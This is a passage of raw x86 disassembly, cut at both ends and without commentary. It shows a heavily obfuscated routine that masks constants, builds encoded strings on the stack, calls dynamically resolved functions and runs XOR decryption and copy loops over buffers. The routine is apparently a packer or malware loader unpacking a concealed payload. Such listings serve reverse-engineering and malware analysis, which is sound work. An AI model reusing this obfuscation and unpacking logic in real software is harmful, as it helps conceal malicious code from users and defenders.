  41d745:	push   DWORD PTR [ebp+0x8]
  41d748:	lea    ecx,[ebp-0xc0]
  41d74e:	mov    DWORD PTR [eax+0x1a8],ecx
  41d754:	call   0x41facd
  41d759:	mov    ecx,DWORD PTR [ebp-0x14]
  41d75c:	xor    ecx,ebx
  41d75e:	add    ecx,esi
  41d760:	cmp    ecx,eax
  41d762:	je     0x41da3f
  41d768:	mov    eax,DWORD PTR [ebp+0x8]
  41d76b:	mov    eax,DWORD PTR [eax+0x194]
  41d771:	mov    ecx,DWORD PTR [eax]
  41d773:	mov    eax,DWORD PTR [ebp+0x8]
  41d776:	mov    eax,DWORD PTR [eax+0x194]
  41d77c:	mov    eax,DWORD PTR [eax]
  41d77e:	add    eax,DWORD PTR [ecx+0x3c]
  41d781:	mov    ecx,DWORD PTR [ebp+0x8]
  41d784:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41d78a:	lea    edx,[ebp-0xc4]
  41d790:	push   edx
  41d791:	mov    edx,DWORD PTR [ebp+0x8]
  41d794:	mov    edx,DWORD PTR [edx+0x18c]
  41d79a:	mov    edx,DWORD PTR [edx]
  41d79c:	add    edx,DWORD PTR [eax+0x88]
  41d7a2:	push   0x4
  41d7a4:	push   DWORD PTR [eax+0x8c]
  41d7aa:	push   edx
  41d7ab:	call   DWORD PTR [ecx+0x1c]
  41d7ae:	push   DWORD PTR [ebp+0x8]
  41d7b1:	mov    edi,DWORD PTR [ebp+0x8]
  41d7b4:	mov    eax,DWORD PTR [ebp+0x8]
  41d7b7:	mov    edx,DWORD PTR [eax+0x1b8]
  41d7bd:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41d7c4:	mov    DWORD PTR [ebp-0x64],0x50c011f
  41d7cb:	mov    WORD PTR [ebp-0x60],0x7c3d
  41d7d1:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  41d7db:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41d7e5:	mov    DWORD PTR [ebp-0x88],0x221d040c
  41d7ef:	mov    DWORD PTR [ebp-0x84],0xe190109
  41d7f9:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  41d800:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41d807:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  41d80e:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41d815:	mov    DWORD PTR [ebp-0x70],0xe190109
  41d81c:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41d823:	call   0x41fafc
  41d828:	push   eax
  41d829:	mov    eax,DWORD PTR [ebp+0x8]
  41d82c:	mov    eax,DWORD PTR [eax+0x1a8]
  41d832:	push   DWORD PTR [eax]
  41d834:	call   0x41f79d
  41d839:	test   eax,eax
  41d83b:	jne    0x41d88d
  41d83d:	mov    eax,DWORD PTR [ebp+0x8]
  41d840:	mov    eax,DWORD PTR [eax+0x1d8]
  41d846:	mov    edi,DWORD PTR [ebp+0x8]
  41d849:	add    eax,0x4
  41d84c:	mov    DWORD PTR [ebp-0x24],eax
  41d84f:	mov    eax,DWORD PTR [ebp+0x8]
  41d852:	mov    edx,DWORD PTR [eax+0x1b8]
  41d858:	call   0x41fafc
  41d85d:	push   eax
  41d85e:	mov    eax,DWORD PTR [ebp-0x24]
  41d861:	call   DWORD PTR [eax]
  41d863:	test   eax,eax
  41d865:	jne    0x41d88d
  41d867:	mov    eax,DWORD PTR [ebp+0x8]
  41d86a:	mov    eax,DWORD PTR [eax+0x1d8]
  41d870:	mov    edi,DWORD PTR [ebp+0x8]
  41d873:	add    eax,0x10
  41d876:	mov    DWORD PTR [ebp-0x24],eax
  41d879:	mov    eax,DWORD PTR [ebp+0x8]
  41d87c:	mov    edx,DWORD PTR [eax+0x1b8]
  41d882:	call   0x41fafc
  41d887:	push   eax
  41d888:	mov    eax,DWORD PTR [ebp-0x24]
  41d88b:	call   DWORD PTR [eax]
  41d88d:	mov    eax,DWORD PTR [ebp-0x14]
  41d890:	mov    ecx,DWORD PTR [ebp-0x28]
  41d893:	xor    eax,ebx
  41d895:	add    eax,esi
  41d897:	cmp    eax,ecx
  41d899:	je     0x41da18
  41d89f:	mov    eax,DWORD PTR [ebp-0x18]
  41d8a2:	xor    eax,ebx
  41d8a4:	mov    ecx,0xffcd8d1e
  41d8a9:	sub    ecx,eax
  41d8ab:	add    ecx,DWORD PTR [ebp-0x28]
  41d8ae:	mov    eax,DWORD PTR [ebp-0x8]
  41d8b1:	cmp    eax,ecx
  41d8b3:	ja     0x41da18
  41d8b9:	mov    DWORD PTR [ebp-0x20],0x0
  41d8c0:	push   DWORD PTR [ebp+0x8]
  41d8c3:	mov    edi,DWORD PTR [ebp+0x8]
  41d8c6:	mov    eax,DWORD PTR [ebp+0x8]
  41d8c9:	mov    edx,DWORD PTR [eax+0x1b4]
  41d8cf:	call   0x41fafc
  41d8d4:	push   eax
  41d8d5:	mov    eax,DWORD PTR [ebp+0x8]
  41d8d8:	mov    eax,DWORD PTR [eax+0x1a8]
  41d8de:	push   DWORD PTR [eax]
  41d8e0:	call   0x41f79d
  41d8e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d8e8:	mov    ecx,DWORD PTR [ecx+0x19c]
  41d8ee:	mov    DWORD PTR [ecx],eax
  41d8f0:	mov    eax,DWORD PTR [ebp+0x8]
  41d8f3:	mov    edi,DWORD PTR [eax+0x1d8]
  41d8f9:	mov    esi,DWORD PTR [ebp+0x8]
  41d8fc:	xor    eax,eax
  41d8fe:	lea    edx,[ebp-0x7c]
  41d901:	call   0x41fb32
  41d906:	push   eax
  41d907:	mov    eax,DWORD PTR [ebp+0x8]
  41d90a:	mov    eax,DWORD PTR [eax+0x19c]
  41d910:	push   DWORD PTR [eax]
  41d912:	call   DWORD PTR [edi+0x8]
  41d915:	mov    DWORD PTR [ebp-0x24],eax
  41d918:	mov    eax,DWORD PTR [ebp+0x8]
  41d91b:	mov    edi,DWORD PTR [eax+0x1d8]
  41d921:	mov    esi,DWORD PTR [ebp+0x8]
  41d924:	xor    eax,eax
  41d926:	lea    edx,[ebp-0x90]
  41d92c:	call   0x41fb32
  41d931:	push   eax
  41d932:	mov    eax,DWORD PTR [ebp+0x8]
  41d935:	mov    eax,DWORD PTR [eax+0x19c]
  41d93b:	push   DWORD PTR [eax]
  41d93d:	call   DWORD PTR [edi+0x8]
  41d940:	and    DWORD PTR [ebp-0x1c],0x0
  41d944:	mov    eax,DWORD PTR [ebp-0x1c]
  41d947:	and    eax,0x7
  41d94a:	add    eax,0x31
  41d94d:	push   eax
  41d94e:	call   DWORD PTR [ebp-0x24]
  41d951:	test   eax,eax
  41d953:	jne    0x41d95a
  41d955:	and    DWORD PTR [ebp-0x10],eax
  41d958:	jmp    0x41d982
  41d95a:	mov    eax,DWORD PTR [ebp+0x8]
  41d95d:	mov    edi,DWORD PTR [eax+0x1d8]
  41d963:	mov    esi,DWORD PTR [ebp+0x8]
  41d966:	xor    eax,eax
  41d968:	lea    edx,[ebp-0x68]
  41d96b:	call   0x41fb32
  41d970:	push   eax
  41d971:	mov    eax,DWORD PTR [ebp+0x8]
  41d974:	mov    eax,DWORD PTR [eax+0x198]
  41d97a:	push   DWORD PTR [eax]
  41d97c:	call   DWORD PTR [edi+0x8]
  41d97f:	mov    DWORD PTR [ebp-0x10],eax
  41d982:	inc    DWORD PTR [ebp-0x1c]
  41d985:	cmp    DWORD PTR [ebp-0x1c],0x10
  41d989:	jb     0x41d944
  41d98b:	mov    eax,DWORD PTR [ebp-0x18]
  41d98e:	mov    esi,DWORD PTR [ebp+0x8]
  41d991:	xor    eax,ebx
  41d993:	mov    edi,0x3272e2
  41d998:	add    eax,edi
  41d99a:	lea    edx,[ebp-0xe4]
  41d9a0:	call   0x41fb32
  41d9a5:	push   eax
  41d9a6:	mov    eax,DWORD PTR [ebp-0x14]
  41d9a9:	mov    esi,DWORD PTR [ebp+0x8]
  41d9ac:	xor    eax,ebx
  41d9ae:	add    eax,edi
  41d9b0:	lea    edx,[ebp-0x104]
  41d9b6:	call   0x41fb32
  41d9bb:	push   eax
  41d9bc:	call   DWORD PTR [ebp-0x10]
  41d9bf:	mov    ecx,DWORD PTR [ebp-0x14]
  41d9c2:	xor    ecx,ebx
  41d9c4:	add    ecx,edi
  41d9c6:	cmp    ecx,eax
  41d9c8:	jne    0x41d9d1
  41d9ca:	mov    DWORD PTR [ebp-0x20],0x1
  41d9d1:	mov    eax,DWORD PTR [ebp-0x18]
  41d9d4:	mov    ecx,DWORD PTR [ebp-0x8]
  41d9d7:	xor    eax,ebx
  41d9d9:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9e0:	mov    DWORD PTR [ebp-0x8],eax
  41d9e3:	mov    eax,DWORD PTR [ebp-0x20]
  41d9e6:	test   eax,eax
  41d9e8:	je     0x41d9fc
  41d9ea:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ed:	mov    ecx,DWORD PTR [ebp-0x38]
  41d9f0:	xor    eax,ebx
  41d9f2:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9f9:	mov    DWORD PTR [ebp-0x38],eax
  41d9fc:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ff:	xor    eax,ebx
  41da01:	mov    ecx,0xffcd8d1e
  41da06:	sub    ecx,eax
  41da08:	add    ecx,DWORD PTR [ebp-0x28]
  41da0b:	mov    eax,DWORD PTR [ebp-0x8]
  41da0e:	cmp    eax,ecx
  41da10:	jbe    0x41d8b9
  41da16:	mov    esi,edi
  41da18:	mov    eax,DWORD PTR [ebp-0x38]
  41da1b:	mov    ecx,DWORD PTR [ebp-0x8]
  41da1e:	cmp    ecx,eax
  41da20:	jne    0x41da33
  41da22:	push   DWORD PTR [ebp+0x8]
  41da25:	lea    eax,[ebp-0x3c]
  41da28:	push   eax
  41da29:	call   0x4205aa
  41da2e:	mov    DWORD PTR [ebp-0x2c],eax
  41da31:	jmp    0x41da3f
  41da33:	mov    eax,DWORD PTR [ebp-0x2c]
  41da36:	mov    ecx,DWORD PTR [ebp-0x18]
  41da39:	xor    ecx,ebx
  41da3b:	add    ecx,esi
  41da3d:	xor    DWORD PTR [eax],ecx
  41da3f:	mov    eax,DWORD PTR [ebp-0x14]
  41da42:	mov    ecx,DWORD PTR [ebp-0x2c]
  41da45:	xor    eax,ebx
  41da47:	add    eax,esi
  41da49:	cmp    eax,ecx
  41da4b:	je     0x41e1c5
  41da51:	mov    eax,DWORD PTR [ebp-0x14]
  41da54:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da57:	xor    eax,ebx
  41da59:	add    eax,esi
  41da5b:	cmp    eax,ecx
  41da5d:	je     0x41e1c5
  41da63:	mov    eax,DWORD PTR [ebp-0x14]
  41da66:	xor    eax,ebx
  41da68:	add    eax,esi
  41da6a:	jmp    0x41da88
  41da6c:	mov    edi,DWORD PTR [ebp-0x2c]
  41da6f:	mov    cl,al
  41da71:	and    cl,0x1f
  41da74:	or     dl,0xff
  41da77:	sub    dl,cl
  41da79:	add    BYTE PTR [edi+eax*1],dl
  41da7c:	mov    ecx,DWORD PTR [ebp-0x18]
  41da7f:	xor    ecx,ebx
  41da81:	lea    eax,[eax+ecx*1+0x3272e2]
  41da88:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da8b:	cmp    eax,ecx
  41da8d:	jb     0x41da6c
  41da8f:	mov    eax,DWORD PTR [ebp-0x3c]
  41da92:	mov    DWORD PTR [ebp-0x28],eax
  41da95:	mov    eax,DWORD PTR [ebp-0x2c]
  41da98:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41da9f:	mov    DWORD PTR [ebp-0xbc],eax
  41daa5:	mov    edi,0xf89c8584
  41daaa:	mov    DWORD PTR [ebp-0x30],edi
  41daad:	mov    eax,DWORD PTR [ebp-0x38]
  41dab0:	xor    eax,ebx
  41dab2:	add    eax,esi
  41dab4:	mov    DWORD PTR [ebp-0xc],eax
  41dab7:	mov    eax,DWORD PTR [ebp-0x38]
  41daba:	xor    eax,ebx
  41dabc:	add    eax,esi
  41dabe:	mov    DWORD PTR [ebp-0x8],eax
  41dac1:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41dac8:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41dacf:	mov    eax,DWORD PTR [ebp-0x38]
  41dad2:	mov    ecx,DWORD PTR [ebp-0x28]
  41dad5:	xor    eax,ebx
  41dad7:	add    eax,esi
  41dad9:	cmp    ecx,eax
  41dadb:	je     0x41dcda
  41dae1:	jmp    0x41dcb6
  41dae6:	mov    ecx,DWORD PTR [ebp-0xc]
  41dae9:	mov    eax,DWORD PTR [ebp-0x28]
  41daec:	sub    eax,ecx
  41daee:	mov    ecx,DWORD PTR [ebp-0x48]
  41daf1:	xor    ecx,ebx
  41daf3:	add    ecx,esi
  41daf5:	xor    edx,edx
  41daf7:	div    ecx
  41daf9:	mov    DWORD PTR [ebp-0x8],eax
  41dafc:	mov    eax,DWORD PTR [ebp-0x54]
  41daff:	mov    ecx,DWORD PTR [ebp-0x8]
  41db02:	xor    eax,ebx
  41db04:	add    eax,esi
  41db06:	cmp    ecx,eax
  41db08:	jbe    0x41db14
  41db0a:	mov    eax,DWORD PTR [ebp-0x54]
  41db0d:	xor    eax,ebx
  41db0f:	add    eax,esi
  41db11:	mov    DWORD PTR [ebp-0x8],eax
  41db14:	mov    eax,DWORD PTR [ebp-0x48]
  41db17:	mov    ecx,DWORD PTR [ebp-0x8]
  41db1a:	xor    eax,ebx
  41db1c:	add    eax,esi
  41db1e:	imul   eax,ecx
  41db21:	mov    DWORD PTR [ebp-0x8],eax
  41db24:	mov    eax,DWORD PTR [ebp-0x38]
  41db27:	mov    ecx,DWORD PTR [ebp-0x8]
  41db2a:	xor    eax,ebx
  41db2c:	add    eax,esi
  41db2e:	cmp    ecx,eax
  41db30:	je     0x41dca4
  41db36:	mov    eax,DWORD PTR [ebp-0x8]
  41db39:	mov    DWORD PTR [ebp-0x10],eax
  41db3c:	mov    eax,DWORD PTR [ebp-0xc]
  41db3f:	add    eax,DWORD PTR [ebp-0xbc]
  41db45:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  41db4c:	mov    DWORD PTR [ebp-0x20],edi
  41db4f:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41db59:	mov    DWORD PTR [ebp-0x8],eax
  41db5c:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41db63:	mov    DWORD PTR [ebp-0x1c],edi
  41db66:	mov    eax,DWORD PTR [ebp-0x24]
  41db69:	xor    eax,ebx
  41db6b:	add    eax,esi
  41db6d:	jmp    0x41dc63
  41db72:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41db7c:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  41db86:	mov    eax,DWORD PTR [ebp-0x1c]
  41db89:	mov    ecx,DWORD PTR [ebp-0x44]
  41db8c:	xor    eax,ebx
  41db8e:	add    eax,esi
  41db90:	imul   eax,ecx
  41db93:	mov    ecx,DWORD PTR [ebp-0x8]
  41db96:	mov    al,BYTE PTR [eax+ecx*1]
  41db99:	mov    BYTE PTR [ebp-0x2],al
  41db9c:	mov    eax,DWORD PTR [ebp-0x1c]
  41db9f:	mov    ecx,DWORD PTR [ebp-0x44]
  41dba2:	xor    eax,ebx
  41dba4:	add    eax,esi
  41dba6:	imul   eax,ecx
  41dba9:	mov    ecx,DWORD PTR [ebp-0xa8]
  41dbaf:	xor    ecx,ebx
  41dbb1:	add    eax,ecx
  41dbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbb6:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dbbe:	mov    ecx,DWORD PTR [ebp-0xb0]
  41dbc4:	xor    ecx,ebx
  41dbc6:	lea    eax,[ecx+eax*1+0x3272e2]
  41dbcd:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dbd1:	xor    ecx,eax
  41dbd3:	mov    BYTE PTR [ebp-0x2],cl
  41dbd6:	mov    al,BYTE PTR [ebp-0x2]
  41dbd9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dbdc:	mov    edx,DWORD PTR [ebp-0x44]
  41dbdf:	xor    ecx,ebx
  41dbe1:	add    ecx,esi
  41dbe3:	imul   ecx,edx
  41dbe6:	mov    edx,DWORD PTR [ebp-0x8]
  41dbe9:	mov    BYTE PTR [ecx+edx*1],al
  41dbec:	mov    eax,DWORD PTR [ebp-0x1c]
  41dbef:	mov    ecx,DWORD PTR [ebp-0x44]
  41dbf2:	xor    eax,ebx
  41dbf4:	add    eax,esi
  41dbf6:	imul   eax,ecx
  41dbf9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbfc:	mov    al,BYTE PTR [eax+ecx*1]
  41dbff:	mov    BYTE PTR [ebp-0x2],al
  41dc02:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc05:	mov    ecx,DWORD PTR [ebp-0x44]
  41dc08:	xor    eax,ebx
  41dc0a:	add    eax,esi
  41dc0c:	imul   eax,ecx
  41dc0f:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc12:	xor    ecx,ebx
  41dc14:	add    eax,ecx
  41dc16:	mov    ecx,DWORD PTR [ebp-0x8]
  41dc19:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dc21:	mov    ecx,DWORD PTR [ebp-0xb8]
  41dc27:	xor    ecx,ebx
  41dc29:	lea    eax,[ecx+eax*1+0x3272e2]
  41dc30:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dc34:	xor    ecx,eax
  41dc36:	mov    BYTE PTR [ebp-0x2],cl
  41dc39:	mov    al,BYTE PTR [ebp-0x2]
  41dc3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc3f:	mov    edx,DWORD PTR [ebp-0x44]
  41dc42:	xor    ecx,ebx
  41dc44:	add    ecx,esi
  41dc46:	imul   ecx,edx
  41dc49:	mov    edx,DWORD PTR [ebp-0x8]
  41dc4c:	mov    BYTE PTR [ecx+edx*1],al
  41dc4f:	mov    eax,DWORD PTR [ebp-0x34]
  41dc52:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc55:	xor    eax,ebx
  41dc57:	xor    ecx,ebx
  41dc59:	add    eax,esi
  41dc5b:	add    ecx,esi
  41dc5d:	imul   eax,ecx
  41dc60:	add    eax,DWORD PTR [ebp-0x44]
  41dc63:	mov    DWORD PTR [ebp-0x44],eax
  41dc66:	mov    eax,DWORD PTR [ebp-0x44]
  41dc69:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc6c:	cmp    ecx,eax
  41dc6e:	jb     0x41db72
  41dc74:	mov    eax,DWORD PTR [ebp-0x20]
  41dc77:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc7a:	xor    eax,ebx
  41dc7c:	add    eax,esi
  41dc7e:	imul   eax,ecx
  41dc81:	mov    ecx,DWORD PTR [ebp-0x24]
  41dc84:	xor    ecx,ebx
  41dc86:	add    ecx,esi
  41dc88:	or     eax,ecx
  41dc8a:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc8d:	xor    ecx,ebx
  41dc8f:	add    eax,ecx
  41dc91:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc94:	xor    ecx,ebx
  41dc96:	add    eax,ecx
  41dc98:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc9b:	lea    eax,[eax+ecx*1+0x64e5c4]
  41dca2:	jmp    0x41dcb3
  41dca4:	mov    eax,DWORD PTR [ebp-0x30]
  41dca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcaa:	xor    eax,ebx
  41dcac:	lea    eax,[eax+ecx*1+0x3272e2]
  41dcb3:	mov    DWORD PTR [ebp-0xc],eax
  41dcb6:	mov    eax,DWORD PTR [ebp-0x30]
  41dcb9:	xor    eax,ebx
  41dcbb:	mov    ecx,0xffcd8d1e
  41dcc0:	sub    ecx,eax
  41dcc2:	add    ecx,DWORD PTR [ebp-0x28]
  41dcc5:	mov    eax,DWORD PTR [ebp-0x30]
  41dcc8:	mov    edx,DWORD PTR [ebp-0xc]
  41dccb:	xor    eax,ebx
  41dccd:	add    eax,esi
  41dccf:	imul   eax,edx
  41dcd2:	cmp    eax,ecx
  41dcd4:	jbe    0x41dae6
  41dcda:	mov    eax,DWORD PTR [ebp-0x14]
  41dcdd:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dce0:	mov    eax,DWORD PTR [ebp+0x8]
  41dce3:	mov    edx,DWORD PTR [ebp-0x4c]
  41dce6:	mov    eax,DWORD PTR [eax+0x1d8]
  41dcec:	xor    edx,ebx
  41dcee:	add    edx,esi
  41dcf0:	push   edx
  41dcf1:	mov    edx,DWORD PTR [ebp-0x40]
  41dcf4:	xor    edx,ebx
  41dcf6:	add    edx,esi
  41dcf8:	push   edx
  41dcf9:	push   ecx
  41dcfa:	mov    DWORD PTR [ebp-0x34],ecx
  41dcfd:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd00:	xor    ecx,ebx
  41dd02:	add    ecx,esi
  41dd04:	push   ecx
  41dd05:	call   DWORD PTR [eax+0x14]
  41dd08:	mov    edi,eax
  41dd0a:	mov    eax,DWORD PTR [ebp-0x14]
  41dd0d:	xor    eax,ebx
  41dd0f:	add    eax,esi
  41dd11:	cmp    eax,edi
  41dd13:	je     0x41dd6e
  41dd15:	mov    eax,DWORD PTR [ebp-0x14]
  41dd18:	jmp    0x41dd3b
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41dd1d:	xor    eax,ebx
  41dd1f:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41dd26:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  41dd2d:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd30:	xor    ecx,ebx
  41dd32:	lea    eax,[ecx+eax*1+0x3272e2]
  41dd39:	xor    eax,ebx
  41dd3b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dd3e:	sub    ecx,esi
  41dd40:	xor    ecx,ebx
  41dd42:	cmp    eax,ecx
  41dd44:	jne    0x41dd1a
  41dd46:	mov    eax,DWORD PTR [ebp+0x8]
  41dd49:	mov    ecx,DWORD PTR [ebp-0x50]
  41dd4c:	mov    eax,DWORD PTR [eax+0x1d8]
  41dd52:	xor    ecx,ebx
  41dd54:	add    ecx,esi
  41dd56:	push   ecx
  41dd57:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd5a:	xor    ecx,ebx
  41dd5c:	add    ecx,esi
  41dd5e:	push   ecx
  41dd5f:	push   DWORD PTR [ebp-0x2c]
  41dd62:	call   DWORD PTR [eax+0x18]
  41dd65:	mov    eax,DWORD PTR [ebp-0x34]
  41dd68:	mov    DWORD PTR [ebp-0x2c],edi
  41dd6b:	mov    DWORD PTR [ebp-0x3c],eax
  41dd6e:	mov    eax,DWORD PTR [ebp-0x2c]
  41dd71:	mov    DWORD PTR [ebp-0x10],eax
  41dd74:	mov    eax,DWORD PTR [ebp-0x18]
  41dd77:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd7a:	xor    eax,ebx
  41dd7c:	add    eax,esi
  41dd7e:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  41dd85:	mov    DWORD PTR [ebp-0x58],0x27143f14
  41dd8c:	jmp    0x41ddbf
  41dd8e:	mov    edx,DWORD PTR [ebp-0x10]
  41dd91:	mov    edi,ecx
  41dd93:	xor    edi,ebx
  41dd95:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  41dd9c:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41dda4:	xor    cl,0x74
  41dda7:	sub    cl,0x8
  41ddaa:	movzx  ecx,cl
  41ddad:	cmp    edx,ecx
  41ddaf:	jne    0x41ddc9
  41ddb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41ddb4:	xor    ecx,ebx
  41ddb6:	lea    ecx,[ecx+edi*1+0x3272e2]
  41ddbd:	xor    ecx,ebx
  41ddbf:	cmp    ecx,0xf89c85bd
  41ddc5:	jne    0x41dd8e
  41ddc7:	jmp    0x41ddd0
  41ddc9:	mov    eax,DWORD PTR [ebp-0x14]
  41ddcc:	xor    eax,ebx
  41ddce:	add    eax,esi
  41ddd0:	mov    ecx,DWORD PTR [ebp-0x14]
  41ddd3:	xor    ecx,ebx
  41ddd5:	add    ecx,esi
  41ddd7:	cmp    ecx,eax
  41ddd9:	je     0x41df4f
  41dddf:	mov    eax,DWORD PTR [ebp-0x10]
  41dde2:	mov    eax,DWORD PTR [eax+0x8]
  41dde5:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41ddec:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41ddf3:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  41ddfa:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41de01:	mov    DWORD PTR [ebp-0x20],eax
  41de04:	mov    eax,DWORD PTR [ebp+0x8]
  41de07:	mov    ecx,DWORD PTR [ebp-0x24]
  41de0a:	xor    ecx,ebx
  41de0c:	add    ecx,esi
  41de0e:	push   ecx
  41de0f:	mov    ecx,DWORD PTR [ebp-0x48]
  41de12:	mov    eax,DWORD PTR [eax+0x1d8]
  41de18:	xor    ecx,ebx
  41de1a:	add    ecx,esi
  41de1c:	push   ecx
  41de1d:	mov    ecx,DWORD PTR [ebp-0x40]
  41de20:	xor    ecx,ebx
  41de22:	add    ecx,esi
  41de24:	push   ecx
  41de25:	mov    ecx,DWORD PTR [ebp-0xc]
  41de28:	xor    ecx,ebx
  41de2a:	add    ecx,esi
  41de2c:	push   ecx
  41de2d:	call   DWORD PTR [eax+0x14]
  41de30:	mov    edi,eax
  41de32:	mov    eax,DWORD PTR [ebp+0x8]
  41de35:	mov    ecx,DWORD PTR [ebp-0x24]
  41de38:	mov    eax,DWORD PTR [eax+0x1d8]
  41de3e:	xor    ecx,ebx
  41de40:	add    ecx,esi
  41de42:	push   ecx
  41de43:	mov    ecx,DWORD PTR [ebp-0x48]
  41de46:	xor    ecx,ebx
  41de48:	add    ecx,esi
  41de4a:	push   ecx
  41de4b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de4e:	push   DWORD PTR [ebp-0x20]
  41de51:	xor    ecx,ebx
  41de53:	add    ecx,esi
  41de55:	push   ecx
  41de56:	call   DWORD PTR [eax+0x14]
  41de59:	mov    ecx,DWORD PTR [ebp-0xc]
  41de5c:	xor    ecx,ebx
  41de5e:	add    ecx,esi
  41de60:	mov    DWORD PTR [ebp-0x24],eax
  41de63:	cmp    ecx,edi
  41de65:	je     0x41e1f2
  41de6b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de6e:	xor    ecx,ebx
  41de70:	add    ecx,esi
  41de72:	cmp    ecx,eax
  41de74:	je     0x41e1f2
  41de7a:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  41de81:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41de88:	mov    ecx,DWORD PTR [ebp-0x40]
  41de8b:	xor    cl,0x9b
  41de8e:	sub    cl,0x1e
  41de91:	mov    BYTE PTR [edi],cl
  41de93:	mov    ecx,DWORD PTR [ebp-0xc]
  41de96:	xor    cl,0x9b
  41de99:	sub    cl,0x1e
  41de9c:	mov    BYTE PTR [edi+0x1],cl
  41de9f:	mov    ecx,DWORD PTR [ebp-0x4c]
  41dea2:	xor    cl,0x9b
  41dea5:	sub    cl,0x1e
  41dea8:	mov    BYTE PTR [edi+0x2],cl
  41deab:	and    DWORD PTR [ebp-0xb4],0x0
  41deb2:	and    DWORD PTR [ebp-0xa4],0x0
  41deb9:	lea    ecx,[ebp-0xa4]
  41debf:	push   ecx
  41dec0:	push   DWORD PTR [ebp-0x20]
  41dec3:	push   eax
  41dec4:	lea    eax,[ebp-0xb4]
  41deca:	push   eax
  41decb:	mov    eax,DWORD PTR [ebp-0x10]
  41dece:	push   DWORD PTR [eax+0xc]
  41ded1:	mov    eax,DWORD PTR [ebp-0x2c]
  41ded4:	add    eax,0x10
  41ded7:	push   eax
  41ded8:	push   edi
  41ded9:	call   0x41d223
  41dede:	mov    DWORD PTR [ebp-0x40],eax
  41dee1:	mov    eax,DWORD PTR [ebp+0x8]
  41dee4:	mov    ecx,DWORD PTR [ebp-0x50]
  41dee7:	mov    eax,DWORD PTR [eax+0x1d8]
  41deed:	xor    ecx,ebx
  41deef:	add    ecx,esi
  41def1:	push   ecx
  41def2:	mov    ecx,DWORD PTR [ebp-0xc]
  41def5:	xor    ecx,ebx
  41def7:	add    ecx,esi
  41def9:	push   ecx
  41defa:	push   edi
  41defb:	call   DWORD PTR [eax+0x18]
  41defe:	mov    eax,DWORD PTR [ebp-0x40]
  41df01:	add    eax,0xffcd8d1e
  41df06:	xor    eax,ebx
  41df08:	cmp    eax,0xf89c8585
  41df0d:	mov    eax,DWORD PTR [ebp+0x8]
  41df10:	mov    eax,DWORD PTR [eax+0x1d8]
  41df16:	mov    ecx,DWORD PTR [ebp-0x50]
  41df19:	jne    0x41df3c
  41df1b:	xor    ecx,ebx
  41df1d:	add    ecx,esi
  41df1f:	push   ecx
  41df20:	mov    ecx,DWORD PTR [ebp-0xc]
  41df23:	xor    ecx,ebx
  41df25:	add    ecx,esi
  41df27:	push   ecx
  41df28:	push   DWORD PTR [ebp-0x2c]
  41df2b:	call   DWORD PTR [eax+0x18]
  41df2e:	mov    eax,DWORD PTR [ebp-0x24]
  41df31:	mov    DWORD PTR [ebp-0x2c],eax
  41df34:	mov    eax,DWORD PTR [ebp-0x20]
  41df37:	mov    DWORD PTR [ebp-0x3c],eax
  41df3a:	jmp    0x41df4f
  41df3c:	xor    ecx,ebx
  41df3e:	add    ecx,esi
  41df40:	push   ecx
  41df41:	mov    ecx,DWORD PTR [ebp-0xc]
  41df44:	xor    ecx,ebx
